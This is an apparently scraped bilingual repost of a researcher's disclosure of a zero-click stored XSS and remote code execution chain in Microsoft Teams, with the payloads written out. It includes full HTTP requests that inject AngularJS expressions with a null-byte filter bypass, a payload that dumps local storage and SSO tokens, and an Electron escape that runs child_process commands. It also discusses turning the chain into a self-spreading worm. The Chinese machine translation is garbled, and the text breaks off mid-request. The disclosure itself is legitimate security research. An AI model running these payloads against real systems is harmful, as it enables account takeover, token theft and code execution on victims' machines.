<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>重要，欺骗（MS团队中的零交互RCE） Important, Spoofing (zero-interaction RCE in MS Teams)</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Important, Spoofing (zero-interaction RCE in MS Teams)<br/>重要，欺骗（MS团队中的零交互RCE） </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-12-07 21:54:30</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2020/12/28c6057ad76715e10a4a54b4b7629622.png"><img src="http://img2.diglog.com/img/2020/12/28c6057ad76715e10a4a54b4b7629622.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>Microsoft accepted this chain of bugs as &#34;Important&#34; (severity), &#34;Spoofing&#34; (impact) in  O365 cloud bug bounty program.  That is one of the lowest in-scope ratings possible.</p><p>Microsoft将此错误链视为“重要”。 （严重程度），＆＃34;欺骗＆＃34; （影响）在O365云漏洞赏金计划中。这是可能的最低范围内评级之一。</p><p> At least now we have a new joke between colleagues - whenever we get a remote code execution (RCE) bug, we call it &#34;Important, Spoofing&#34;. Thanks Microsoft!  😂</p><p> 至少现在我们在同事之间开了个新玩笑-每当我们遇到远程代码执行（RCE）错误时，我们都将其称为“重要，欺骗”。谢谢微软！ 😂</p><p> To be entirely fair, they did have a separate rating for the desktop app as &#34;Critical, Remote Code Execution&#34;, but only for &#34;Microsoft points&#34;! Microsoft points get you on  MSRC leaderboards.</p><p> 公平地说，他们确实将台式机应用程序评为“关键，远程执行代码”，但仅针对“微软积分”！微软的积分使您进入MSRC排行榜。</p><p> Enjoy reading this writeup! This is the first from five zero or one-click Microsoft Teams remote code execution (&#34;Important, Spoofing&#34;) bug chains sent in to MSRC.</p><p> 喜欢阅读这篇文章！这是发送给MSRC的五个零或一键单击Microsoft Teams远程代码执行（“重要，欺骗”）错误链中的第一个。</p><p>     ‼️    That&#39;s it. There is no further interaction from vicim. Now your company&#39;s internal network, personal documents, O365 documents/mail/notes, secret chats are fully compromised. Think about it. One message, one channel, no interaction. Everyone gets exploited.</p><p>     ！️就是这样。 vicim没有进一步的互动。现在，您公司的内部网络，个人文档，O365文档/邮件/便笺，秘密聊天已被完全破坏。想一想。一条消息，一条渠道，没有互动。每个人都被剥削。</p><p> So let&#39;s expand on that. What if the recipients then automatically post it in their teams, channels? Everybody gets exploited. Did you know you can be a guest in other organisations? Probably your organisation already has several guests. They most likely are in their own organisations and those orgs probably have guests, which are in their own organisations, which are ...  🙂   Yes, it could be made into a worm, which spreads within the Microsoft Teams network, at least within an organisation.</p><p> 因此，让我们对此进行扩展。如果收件人随后将其自动发布到其团队，渠道中怎么办？每个人都被剥削。您知道您可以成为其他组织的客人吗？您的组织可能已经有几个来宾。他们很可能在自己的组织中，而那些组织可能在他们自己的组织中有客人，这些人是……...是的，它可能会变成蠕虫，并在Microsoft Teams网络中传播，至少在一个内部。组织。</p><p> The demo is almost boring - all you need is a non-interactive single HTTP request.</p><p> 该演示几乎无聊-您只需要一个非交互式的单个HTTP请求即可。 </p><p>  After receiving the &#34;Important, Spoofing&#34; rating, I sent a list of bulletpoints - what I considered the real impact as argumentation to MSRC employees. I was hoping maybe they reconsider. The discussion was mostly without substance - just reiterating the ratings. It took weeks for each response, every time me having to remind them about it.</p><p>收到“重要的欺骗”邮件后，评级后，我发送了一系列要点-我认为对MSRC员工的论点是真正的影响。我希望他们能重新考虑。讨论基本上没有实质性内容，只是重申了评级。每次回复都花了数周时间，每次我都要提醒他们。</p><p> Sooo, after around 3 months it ended as-is: &#34;Important, Spoofing&#34; and that the desktop client - remote code execution - is &#34;out of scope&#34;.</p><p> 如此，大约3个月后，它按原样结束：＆＃34;重要的欺骗＆＃34;并且桌面客户端-远程代码执行-超出了范围＆＃34;。</p><p> I mean, Microsoft can take the desktop app out of scope, which in my opinion is absurd as it&#39;s promoted as the primary way to use Microsoft Teams.. but how is any of this &#34;Important&#34; and what the hell is &#34;Spoofing&#34;?  😀</p><p> 我的意思是，Microsoft可以将桌面应用程序排除在范围之外，我认为这是荒谬的，因为它被推广为使用Microsoft Teams的主要方式。.但是，任何重要的事情如何呢？到底是什么欺骗？ 😀</p><p>  Stored XSS with no interaction required. Impacts all messaging thread types - private, threads, groups etc.</p><p>  无需交互即可存储的XSS。影响所有消息传递线程类型-专用，线程，组等。</p><p> Self-replicating worm - victim reposts payload to all contacts, groups. Everyone reposts to contacts, groups (guests have access to orgs too, which have access to their own orgs etc.)</p><p> 自复制蠕虫-受害者将有效载荷重新发布到所有联系人，组。每个人都重新发布到联系人，组（访客也可以访问组织，而组织也可以访问自己的组织等）</p><p> SSO token stealing for all org users - you have access to all SSO O365 tokens from XSS in i.e. account takeover - which means access to company mail, documents, notes, everything in O365</p><p> 所有组织用户的SSO令牌窃取-您可以通过XSS在帐户接管中访问所有SSO O365令牌-这意味着可以访问公司邮件，文档，说明以及O365中的所有内容</p><p> Access to private conversations, messages, files, call logs and everything else you have in MS Teams</p><p> 访问私人对话，消息，文件，通话记录以及您在MS Teams中拥有的所有其他内容 </p><p>   Arbitrary command execution on victim devices with no interaction from victim, cross platform (macOS, Windows, Linux)</p><p>在受害设备上任意执行命令，不受受害者，跨平台（macOS，Windows，Linux）的交互</p><p> Complete loss of confidentiality &amp; integrity for end users - access to private chats, files, internal network, private keys and personal data outside MS Teams</p><p> 完全丧失机密性最终用户的完整性-在MS Teams之外访问私人聊天，文件，内部网络，私人密钥和个人数据</p><p> Ever wonder how MS Teams can &#39;seamlessly&#39; access everything in your O365? Attackers don&#39;t, they could in the same way Teams does.</p><p> 曾经想过MS团队如何无缝地＆＃39;访问您的O365中的所有内容？攻击者不会，而Teams也可以这样做。</p><p>  An additional, universal Electron  redacted RCE payload, which was included in the report&#39;s video/media attachments</p><p>  报告的视频/媒体附件中包含了另一个通用的电子编辑的RCE有效负载</p><p> Both RCE payloads allow to bypass Microsoft Teams specific Electron app security, but probably could be universally adapted to older ElectronJS versions with similar security constraints.</p><p> 两种RCE有效负载均允许绕过Microsoft团队特定的Electron应用程序安全性，但可能可以普遍适用于具有类似安全性约束的旧版ElectronJS。</p><p> MS Teams ElectronJS security:  remote-require is disabled &amp; filtered,  nodeIntegration is  false,  webview creation is filtered and normally removes insecure params/options. You cannot simply import  child_process and execute arbitrary code or create a  webview with a custom  preload option.</p><p> MS Teams ElectronJS安全性：远程要求已禁用＆amp;已过滤，nodeIntegration为false，已过滤Web视图创建，并且通常会删除不安全的参数/选项。您不能简单地导入child_process并执行任意代码或使用自定义预加载选项创建Web视图。</p><p>    Ok, the injected template string is visible for a split second, but normally you wouldn&#39;t see it - as can be evidenced in the next demo and all the rest of AngularJS template strings in Teams you don&#39;t see. I attribute the glitch to the HTTP proxy, general slowness of the app, live-reloading and the fact that it&#39;s a demo so it must fail in some way  🙂</p><p>    好的，注入的模板字符串在一秒钟内是可见的，但是通常您不会看到它-在下一个演示中以及您看不到的Teams中所有其他AngularJS模板字符串中可以证明。我将故障归因于HTTP代理，应用程序普遍运行缓慢，实时重新加载以及它是一个演示程序，因此它一定会失败的事实🙂 </p><p>    The blank window could have arbitrary content, size, look - it&#39;s &#34;suspiciously blank&#34; because it&#39;s a PoC.</p><p>空白窗口可以具有任意内容，大小和外观-可疑地为空白因为它是PoC。</p><p>  No user interaction is required, exploit executes upon seeing the chat message. This exploit bypasses webview restrictions and abuses MS Teams API calls to &#34;download&#34; a file and use it as  preload (nodeJS context) for a  webview. Teams actually filters  webview creation - filtering  preload and other dangerous options, but in this way the check could be bypassed. Probably the idea could be used in other, older ElectronJS apps.</p><p>  无需用户交互，漏洞利用程序会在看到聊天消息后执行。此漏洞利用绕过了Webview限制，并滥用了MS Teams API调用＆＃34; download＆＃34;一个文件，并将其用作Webview的预加载（nodeJS上下文）。团队实际上过滤了Webview的创建-过滤了预加载和其他危险的选项，但是这样可以绕过检查。这个想法可能可以在其他较旧的ElectronJS应用程序中使用。</p><p> cmd  =  `open /System/Applications/Calculator.app`  // change to windows/linux command as required stage1  =  `data:text/plain,cp=require(&#39;child_process&#39;);cp.exec(&#39;  ${ cmd }&#39;)` ;  // create a virtual file to download this . electronSafeIpc . send ( `desktopFileDownload` ,  stage1 ) ;  // request to download file // implement an event handler when files downloaded to trigger payload this . electronSafeIpc . on ( `desktop-file-download-finished` ,  ( _ ,  fileinfo )  =&gt;  {  f  =  fileinfo . uniqueFile . filePath ;  // event gives us file path which we don&#39;t know beforehand  // create a new webview mockup - window with a webview tag and our virtual, downloaded file as preload  stage2  =  `data:text/html,&lt;webview src=&#39;about:blank&#39; preload=&#39;file:///  ${ f }&#39;&gt;&lt;/webview&gt;`  this . electronSafeIpc . send ( `allowWindowOpenUrl` ,  stage2 ) ;  // abusing MS Teams IPC API to allow above URL  this . w  =  window . open ( stage2 ) ;  // URL gets opened, webview gets created with our virtual, downloaded file preload  setTimeout ( ( ) =&gt; { this . w . close ( ) } , 1000 )  // not necessary, but let&#39;s close the custom window  } )</p><p> cmd =`open / System / Applications / Calculator.app` //根据需要更改为Windows / linux命令stage1 =`data：text / plain，cp = require（＆＃39; child_process＆＃39;）; cp.exec（ ＆＃39; $ {cmd}＆＃39;）`; //创建一个虚拟文件以下载此文件。 electronicSafeIpc。发送（`desktopFileDownload`，stage1）; //请求下载文件//在下载文件以触发有效载荷this时实现事件处理程序。 electronicSafeIpc。 on（`desktop-file-download-finished`，（_，fileinfo）=＆gt; {f = fileinfo。uniqueFile。filePath; //事件为我们提供了我们事先不知道的文件路径//创建一个新webview样机-具有webview标记和我们虚拟下载的文件的窗口，作为预加载stage2 =`data：text / html，＆lt; webview src =＆＃39; about：blank＆＃39; preload =＆＃39; file：// / $ {f}＆＃39;＆lt; / webview＆gt;`this.electronSafeIpc。send（`allowWindowOpenUrl`，stage2）; //滥用MS Teams IPC API允许上面的URL此w.window.open（stage2 ）; //打开URL，并使用我们已下载的虚拟下载文件预加载setTimeout（（）=＆gt; {this。w。close（）}，1000）//创建// WebView，//不需要，但让我们关闭自定义窗口}）</p><p>   A Remote Code Execution vulnerability has been identified in MS Teams desktop which can be triggered by a novel XSS (Cross-Site Scripting) injection in teams.microsoft.com. A specifically crafted chat message can be sent to any Microsoft Teams member or channel which will execute arbitrary code on victim PC&#39;s with NO USER INTERACTION.</p><p>   MS Teams桌面中已发现一个“远程执行代码”漏洞，该漏洞可能由team.microsoft.com中的新型XSS（跨站点脚本）注入触发。可以将特制的聊天消息发送到任何Microsoft Teams成员或渠道，这些成员或渠道将在无需用户交互的情况下在受害PC上执行任意代码。</p><p> Remote Code Execution has been achieved in desktop applications across all supported platforms (Windows, macOS, Linux). Code execution gives attackers full access to victim devices and company internal networks via those devices.</p><p> 已在所有受支持平台（Windows，macOS，Linux）的桌面应用程序中实现了远程代码执行。代码执行使攻击者可以通过这些设备完全访问受害设备和公司内部网络。</p><p> Even without arbitrary code execution on victim device, with the demonstrated XSS it&#39;s possible for an attacker to obtain SSO authorisation tokens for Microsoft Teams and other Microsoft Services (e.g. Skype, Outlook, Office365). Furthermore, the XSS vulnerability by itself allows to access confidential / private conversations, files etc. from within MS Teams.</p><p> 即使没有在受害设备上执行任意代码，使用演示的XSS，攻击者也有可能获得Microsoft Teams和其他Microsoft Services（例如Skype，Outlook，Office365）的SSO授权令牌。此外，XSS漏洞本身允许从MS Teams内部访问机密/私人对话，文件等。</p><p> These attacks could be performed by guest users completely silently with no user interaction or indications of compromise.</p><p> 来宾用户可以完全无提示地执行这些攻击，而无需用户干预或损害的迹象。 </p><p>    &#39;wormable&#39; - possible to automatically repost the exploit payload to other companies, channels, users with no interaction</p><p>＆＃39;蠕虫＆＃39; -可以自动将漏洞有效载荷重新发布到其他公司，渠道，用户，而无需交互</p><p>  complete loss of confidentiality &amp; integrity for end users - access to private chats, files, internal network, private keys and personal data outside MS Teams</p><p>  完全丧失机密性最终用户的完整性-在MS Teams之外访问私人聊天，文件，内部网络，私人密钥和个人数据</p><p> access to SSO tokens and therefore other Microsoft services in addition to MS Teams (Outlook, Office365 etc.)</p><p> 访问SSO令牌，从而访问除MS Teams（Outlook，Office365等）之外的其他Microsoft服务</p><p>  This report contains a new XSS vector and a novel RCE payload which are used together. It affects the chatting system within Microsoft Teams and can be used in e.g. direct messages, channels.</p><p>  该报告包含一起使用的新的XSS向量和新颖的RCE有效负载。它会影响Microsoft Teams中的聊天系统，并且可以在例如直接消息，渠道。</p><p>     Type a chat message in either direct communication or channel, mention a user or a custom tag within this chat</p><p>     在直接通讯或频道中输入聊天消息，并在此聊天中提及用户或自定义标签</p><p> Edit the chat message containing the mention and intercept with a HTTP proxy like Burp Suite</p><p> 编辑包含提及内容的聊天消息，并使用HTTP代理（例如Burp Suite）进行拦截</p><p> In mention functionality, the vulnerable parameter is  displayName within the  { content: &#34;...&#34;, properties: { &#34;mentions&#34; : &#34;[{ displayName: PAYLOAD HERE }]&#34; JSON message structure.</p><p> 在提及功能方面，易受攻击的参数是{content：＆＃34; ...＆＃34;属性：{＆＃34; mentions＆＃34; ：＆＃34; [{displayName：PAYLOAD HERE}]＆＃34 ;： JSON消息结构。 </p><p>  PUT  /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1  Host: emea.ng.msg.teams.microsoft.com  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0  Accept: json  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/json  Authentication: skypetoken=...snip...  ClientInfo: os=macos; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2020080725; utcOffset=+03:00  BehaviorOverride: redirectAs404  Content-Length: 1174{  &#34;content &#34;:  &#34;&lt;div&gt;&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt;&lt;span itemscope itemtype= \&#34;http://schema.skype.com/Mention \&#34; itemid= \&#34;0 \&#34;&gt;dada&lt;/span&gt;&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; &#34;,  &#34;messagetype &#34;:  &#34;RichText/Html &#34;,  &#34;contenttype &#34;:  &#34;text &#34;,  &#34;amsreferences &#34;:[],  &#34;clientmessageid &#34;:  &#34;9868848366534370000 &#34;,  &#34;imdisplayname &#34;:  &#34;Oskars Vegeris &#34;,  &#34;properties &#34;:{  &#34;importance &#34;:  &#34; &#34;,  &#34;subject &#34;: null,  &#34;mentions &#34;:  &#34;[{ \&#34;@type \&#34;: \&#34;http://schema.skype.com/Mention \&#34;, \&#34;itemid \&#34;:0, \&#34;tagId \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mri \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mentionType \&#34;: \&#34;tag \&#34;, \&#34;displayName \&#34;: \&#34;x marks the spot \&#34;}] &#34;}}</p><p>PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP / 1.1主机：emea.ng.msg.teams.microsoft.com用户代理：Mozilla / 5.0（Macintosh； Intel Mac OS X 10.15; rv：81.0）Gecko / 20100101 Firefox / 81.0 Accept：json Accept-Language：zh-cn，en; q = 0.5 Accept-Encoding：gzip，deflate Content-Type：application / json身份验证：skypetoken = ...剪... ClientInfo：os = macos; osVer = 10; proc = x86; lcid = zh-cn; deviceType = 1; country = us; clientName = skypeteams; clientVer = 1415 / 1.0.0.2020080725; utcOffset = + 03：00 BehaviorOverride：redirectAs404 Content-Length：1174 {＆＃34; content＆＃34 ;:＆＃34;＆lt; div＆gt;＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt;＆lt; span itemscope itemtype = \＆＃34; http：//schema.skype.com/Mention \＆＃34; itemid = \＆＃34; 0 \＆＃34; dada＆lt; / span＆gt;＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; ＆＃34;，＆＃34;消息类型＆＃34;：＆＃34; RichText / Html＆＃34;，＆＃34;内容类型＆＃34;：＆＃34;文本＆＃34;，＆＃34 ; amsreferences＆＃34;：[]，＆＃34; clientmessageid＆＃34 ;:＆＃34; 9868848366534370000＆＃34 ;,＆＃34; imdisplayname＆＃34 ;:＆＃34; Oskars Vegeris＆＃34; ，＆＃34;属性＆＃34;：{＆＃34;重要性＆＃34 ;:＆＃34; ＆＃34 ;、＆＃34;主题：null，＆＃34;提及＆＃34 ;：＆＃34; [{\＆＃34; @type \＆＃34 ;： \＆＃34 ; http：//schema.skype.com/Mention \＆＃34;，\＆＃34; itemid \＆＃34;：0，\＆＃34; tagId \＆＃34 ;： \＆＃34; tHab2TLzpa \＆＃34;，\＆＃34;：\＆＃34; tHab2TLzpa \＆＃34;，\＆mentionType \＆＃34;：\＆＃34;标记\＆ ＃34;，\＆＃34; displayName \＆＃34 ;： \＆＃34; x标记了点\＆＃34;}]＆＃34;}}</p><p> angular expression filtering can be bypassed by injecting a nullbyte char in unicode  \u0000, e.g.</p><p> 可以通过在Unicode \ u0000中插入一个空字节char来绕过角度表达式过滤，例如</p><p>  To access user&#39;s local storage and all SSO tokens, use this payload within  displayName in the above HTTP PUT request.</p><p>  要访问用户的本地存储和所有SSO令牌，请在上述HTTP PUT请求中的displayName中使用此有效负载。</p><p>   PUT  /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1  Host: emea.ng.msg.teams.microsoft.com  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0  Accept: json  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/json  Authentication: skypetoken=...snip...  ClientInfo: os=macos; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2020080725; utcOffset=+03:00  BehaviorOverride: redirectAs404  Content-Length: 1174{  &#34;content &#34;:  &#34;&lt;div&gt;&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt;&lt;span itemscope itemtype= \&#34;http://schema.skype.com/Mention \&#34; itemid= \&#34;0 \&#34;&gt;dada&lt;/span&gt;&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; &#34;,  &#34;messagetype &#34;:  &#34;RichText/Html &#34;,  &#34;contenttype &#34;:  &#34;text &#34;,  &#34;amsreferences &#34;:[],  &#34;clientmessageid &#34;:  &#34;9868848366534370000 &#34;,  &#34;imdisplayname &#34;:  &#34;Oskars Vegeris &#34;,  &#34;properties &#34;:{  &#34;importance &#34;:  &#34; &#34;,  &#34;subject &#34;: null,  &#34;mentions &#34;:  &#34;[{ \&#34;@type \&#34;: \&#34;http://schema.skype.com/Mention \&#34;, \&#34;itemid \&#34;:0, \&#34;tagId \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mri \&#34;: \&#34;tHab2TLzpa \&#34;, \&#34;mentionType \&#34;: \&#34;tag \&#34;, \&#34;displayName \&#34;: \&#34;x marks the spot{{[&#39;if(typeof onetime==`undefined`){onetime=1;console.log(localStorage);}&#39;].forEach($root.$$childHead.$$nextSibling.app.$window.eval)} \u0000} \&#34;}] &#34;}}</p><p>   PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP / 1.1主机：emea.ng.msg.teams.microsoft.com用户代理：Mozilla / 5.0（Macintosh； Intel Mac OS X 10.15; rv：81.0）Gecko / 20100101 Firefox / 81.0 Accept：json Accept-Language：zh-cn，en; q = 0.5 Accept-Encoding：gzip，deflate Content-Type：application / json身份验证：skypetoken = ...剪... ClientInfo：os = macos; osVer = 10; proc = x86; lcid = zh-cn; deviceType = 1; country = us; clientName = skypeteams; clientVer = 1415 / 1.0.0.2020080725; utcOffset = + 03：00 BehaviorOverride：redirectAs404 Content-Length：1174 {＆＃34; content＆＃34 ;:＆＃34;＆lt; div＆gt;＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt;＆lt; span itemscope itemtype = \＆＃34; http：//schema.skype.com/Mention \＆＃34; itemid = \＆＃34; 0 \＆＃34; dada＆lt; / span＆gt;＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; ＆＃34;，＆＃34;消息类型＆＃34 ;：＆＃34; RichText / Html＆＃34 ;、＆＃34; contenttype＆＃34 ;：＆＃34; text＆＃34 ;、＆＃34 ; amsreferences＆＃34;：[]，＆＃34; clientmessageid＆＃34 ;:＆＃34; 9868848366534370000＆＃34 ;,＆＃34; imdisplayname＆＃34 ;:＆＃34; Oskars Vegeris＆＃34; ，＆＃34;属性＆＃34;：{＆＃34;重要性＆＃34 ;:＆＃34; ＆＃34 ;、＆＃34;主题：null，＆＃34;提及＆＃34 ;：＆＃34; [{\＆＃34; @type \＆＃34 ;： \＆＃34 ; http：//schema.skype.com/Mention \＆＃34;，\＆＃34; itemid \＆＃34;：0，\＆＃34; tagId \＆＃34 ;： \＆＃34; tHab2TLzpa \＆＃34;，\＆＃34;：\＆＃34; tHab2TLzpa \＆＃34;，\＆mentionType \＆＃34;：\＆＃34;标记\＆ ＃34;，\＆＃34; displayName \＆＃34 ;： \＆＃34; x标记该点{{{＆＃39; if（typeof onetime ==`undefined`）{onetime = 1; console.log （localStorage）;}＆＃39;]。forEach（$ root。$$ childHead。$$ nextSibling.app。$ window.eval）} \ u0000} \＆＃34;}]＆＃34;}}</p><p>  no further actions are necessary. all users within this chat will start logging their SSO tokens which can be exfiltrated.</p><p>  无需采取进一步措施。聊天中的所有用户将开始记录其SSO令牌，这些令牌可以被窃取。</p><p> you can verify this by checking development tools in either Microsoft Teams desktop or any browser.</p><p> 您可以通过在Microsoft Teams桌面或任何浏览器中检查开发工具来验证这一点。</p><p>  A novel remote code execution payload was developed, which bypasses all restrictions currently implemented (remote require, node integration, webview preload filtering etc.) in Microsoft Teams desktop and should work even if  contextIsolation was enabled.</p><p>  开发了一种新颖的远程代码执行有效负载，该负载绕过了Microsoft Teams桌面中当前实施的所有限制（远程需求，节点集成，Webview预加载过滤等），即使启用了contextIsolation，它也可以正常工作。 </p><p> cmd  =  `open /Applications/Calculator.app`  // change to windows/linux command as required stage1  =  `data:text/plain,cp=require(&#39;child_process&#39;);cp.exec(&#39;  ${ cmd }&#39;)` ;  // create a virtual file to download this . electronSafeIpc . send ( `desktopFileDownload` ,  stage1 ) ;  // request to download file // implement an event handler when files downloaded to trigger payload this . electronSafeIpc . on ( `desktop-file-download-finished` ,  ( _ ,  fileinfo )  =&gt;  {  f  =  fileinfo . uniqueFile . filePath ;  // event gives us file path which we don&#39;t know beforehand  // create a new webview mockup - window with a webview tag and our virtual, downloaded file as preload  stage2  =  `data:text/html,&lt;webview src=&#39;about:blank&#39; preload=&#39;file:///  ${ f }&#39;&gt;&lt;/webview&gt;`  this . electronSafeIpc . send ( `allowWindowOpenUrl` ,  stage2 ) ;  // abusing MS Teams IPC API to allow above URL  this . w  =  window . open ( stage2 ) ;  // URL gets opened, webview gets created with our virtual, downloaded file preload  setTimeout ( ( ) =&gt; { this . w . close ( ) } , 1000 )  // not necessary, but let&#39;s close the custom window  } )</p><p>cmd =`open / Applications / Calculator.app` //根据需要更改为Windows / linux命令stage1 =`data：text / plain，cp = require（＆＃39; child_process＆＃39;）; cp.exec（＆＃ 39; $ {cmd}＆＃39;）`; //创建一个虚拟文件以下载此文件。 electronicSafeIpc。发送（`desktopFileDownload`，stage1）; //请求下载文件//在下载文件以触发有效载荷this时实现事件处理程序。 electronicSafeIpc。 on（`desktop-file-download-finished`，（_，fileinfo）=＆gt; {f = fileinfo。uniqueFile。filePath; //事件为我们提供了我们事先不知道的文件路径//创建一个新webview样机-具有webview标记和我们虚拟下载的文件的窗口，作为预加载stage2 =`data：text / html，＆lt; webview src =＆＃39; about：blank＆＃39; preload =＆＃39; file：// / $ {f}＆＃39;＆lt; / webview＆gt;`this.electronSafeIpc。send（`allowWindowOpenUrl`，stage2）; //滥用MS Teams IPC API允许上面的URL此w.window.open（stage2 ）; //打开URL，并使用我们已下载的虚拟下载文件预加载setTimeout（（）=＆gt; {this。w。close（）}，1000）//创建// WebView，//不需要，但让我们关闭自定义窗口}）</p><p>    PUT  /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1  Host: emea.ng.msg.teams.microsoft.com  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0  Accept: json  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/json  Authentication: ...snip...  ClientInfo: os=macos; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2020080725; utcOffset=+03:00  BehaviorOverride: redirectAs404  Content-Length: 1174{&#34;content&#34;:&#34;&lt;div&gt;&lt;div&gt;\n&lt;div&gt;\n&lt;div&gt;\n&lt;div&gt;\n&lt;div&gt;&lt;span itemscope itemtype=\&#34;http://schema.skype.com/Mention\&#34; itemid=\&#34;0\&#34;&gt;dada&lt;/span&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;&#34;,&#34;messagetype&#34;:&#34;RichText/Html&#34;,&#34;contenttype&#34;:&#34;text&#34;,&#34;amsreferences&#34;:[],&#34;clientmessageid&#34;:&#34;9868848366534370000&#34;,&#34;imdisplayname&#34;:&#34;Oskars Vegeris&#34;,&#34;properties&#34;:{&#34;importance&#34;:&#34;&#34;,&#34;subject&#34;:null,&#34;mentions&#34;:&#34;[{\&#34;@type\&#34;:\&#34;http://schema.skype.com/Mention\&#34;,\&#34;itemid\&#34;:0,\&#34;tagId\&#34;:\&#34;tHab2TLzpa\&#34;,\&#34;mri\&#34;:\&#34;tHab2TLzpa\&#34;,\&#34;mentionType\&#34;:\&#34;tag\&#34;,\&#34;displayName\&#34;:\&#34;x marks the spot{{[&#39;if(typeof mentiontime==`undefined`){mentiontime=1;stage1=`data:text/plain,cp=require(\\\&#34;child_process\\\&#34;);cp.exec(\\\&#34;open /System/Applications/Calculator.app\\\&#34;)`;this.electronSafeIpc.send(`desktopFileDownload`,stage1);this.electronSafeIpc.on(`desktop-file-download-finished`,(_,fileinfo)=&gt;{f=fileinfo.uniqueFile.filePath;stage2=`data:text/html,&lt;webview src=\\\&#34;about:blank\\\&#34; preload=\\\&#34;file:///${f}\\\&#34;&gt;&lt;/webview&gt;`;this.electronSafeIpc.send(`allowWindowOpenUrl`,stage2);this.w=window.open(stage2);setTimeout(()=&gt;{this.w.close()},2000)})}&#39;].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}\u0000}\&#34;}]&#34;}}</p><p>    PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP / 1.1主机：emea.ng.msg.teams.microsoft.com用户代理：Mozilla / 5.0（Macintosh； Intel Mac OS X 10.15; rv：81.0）Gecko / 20100101 Firefox / 81.0 Accept：json Accept-Language：zh-cn，en; q = 0.5 Accept-Encoding：gzip，deflate Content-Type：application / json身份验证：... snip。 .. ClientInfo：os = macos; osVer = 10; proc = x86; lcid = zh-cn; deviceType = 1; country = us; clientName = skypeteams; clientVer = 1415 / 1.0.0.2020080725; utcOffset = + 03：00 BehaviorOverride：redirectAs404 Content-Length：1174 {＆＃34; content＆＃34;：＆＃34;＆lt; div＆gt;＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt; \ n＆lt; div＆gt; ; \ 